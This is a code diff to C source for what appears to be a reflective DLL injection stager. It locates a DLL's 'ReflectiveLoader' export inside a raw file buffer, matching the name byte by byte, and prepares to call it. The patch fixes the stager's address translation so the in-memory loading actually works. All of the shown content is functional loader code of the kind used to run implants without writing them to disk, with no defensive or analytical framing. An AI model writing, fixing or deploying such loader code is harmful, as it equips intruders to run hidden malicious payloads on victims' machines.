@@ -17,6 +17,27 @@
 typedef unsigned long long QWORD;
 typedef ULONG_PTR(WINAPI *BW_LOADER)(LPVOID);
 
+/* the flat copy is FILE-format: export-directory RVAs must be translated
+ * through the section table (in the mapped image the loader walks them
+ * at natural RVAs - here they are raw offsets off by the va/raw delta) */
+static DWORD bw_rva_to_raw(unsigned char *flat, DWORD lfanew, DWORD rva)
+{
+	WORD nsec = *(WORD *)(flat + lfanew + 6);
+	WORD optsz = *(WORD *)(flat + lfanew + 20);
+	WORD i;
+	for (i = 0; i < nsec; i++) {
+		unsigned char *so = flat + lfanew + 24 + optsz + (DWORD)i * 40;
+		DWORD vsz = *(DWORD *)(so + 8);
+		DWORD va = *(DWORD *)(so + 12);
+		DWORD rsz = *(DWORD *)(so + 16);
+		DWORD rp = *(DWORD *)(so + 20);
+		DWORD span = vsz ? vsz : rsz;
+		if (rva >= va && rva < va + span)
+			return rp + (rva - va);
+	}
+	return 0;
+}
+
 #define BW_MAX_FILE 0x2000000 /* 32 MB ceiling for sanity */
 
 static void bw_die(DWORD code)
@@ -31,7 +52,7 @@ void bw_entry(void)
 	DWORD size, got, i;
 	unsigned char *buf, *flat, *pe;
 	QWORD len;
-	DWORD lfanew, exp_rva, exp_sz;
+	DWORD lfanew, exp_rva, exp_raw, exp_sz;
 	unsigned char *ed;
 	DWORD *names, *funcs;
 	WORD *ords;
@@ -99,20 +120,23 @@ void bw_entry(void)
 			d[i] = src2[i];
 	}
 
-	/* walk the DLL exports for ReflectiveLoader */
+	/* walk the DLL exports for ReflectiveLoader (RVA->raw translated) */
 	lfanew = *(DWORD *)(flat + 0x3C);
 	exp_rva = *(DWORD *)(flat + lfanew + 0x88);
 	if (exp_rva == 0)
 		bw_die(8);
+	exp_raw = bw_rva_to_raw(flat, lfanew, exp_rva);
+	if (exp_raw == 0)
+		bw_die(8);
 	exp_sz = *(DWORD *)(flat + lfanew + 0x8C);
-	ed = flat + exp_rva;
+	ed = flat + exp_raw;
 	nnames = *(DWORD *)(ed + 0x18);
-	names = (DWORD *)(flat + *(DWORD *)(ed + 0x20));
-	ords = (WORD *)(flat + *(DWORD *)(ed + 0x24));
-	funcs = (DWORD *)(flat + *(DWORD *)(ed + 0x1C));
+	names = (DWORD *)(flat + bw_rva_to_raw(flat, lfanew, *(DWORD *)(ed + 0x20)));
+	ords = (WORD *)(flat + bw_rva_to_raw(flat, lfanew, *(DWORD *)(ed + 0x24)));
+	funcs = (DWORD *)(flat + bw_rva_to_raw(flat, lfanew, *(DWORD *)(ed + 0x1C)));
 	loader = NULL;
 	for (k = 0; k < nnames; k++) {
-		const char *n = (const char *)(flat + names[k]);
+		const char *n = (const char *)(flat + bw_rva_to_raw(flat, lfanew, names[k]));
 		if (n[0] == 'R' && n[1] == 'e' && n[2] == 'f' && n[3] == 'l' &&
 		    n[4] == 'e' && n[5] == 'c' && n[6] == 't' && n[7] == 'i' &&
 		    n[8] == 'v' && n[9] == 'e' && n[10] == 'L' && n[11] == 'o' &&
@@ -120,7 +144,7 @@ void bw_entry(void)
 		    n[16] == 0) {
 			DWORD frva = funcs[ords[k]];
 			if (!(frva >= exp_rva && frva < exp_rva + exp_sz))
-				loader = (BW_LOADER)(flat + frva);
+				loader = (BW_LOADER)(flat + bw_rva_to_raw(flat, lfanew, frva));
 			break;
 		}
 	}
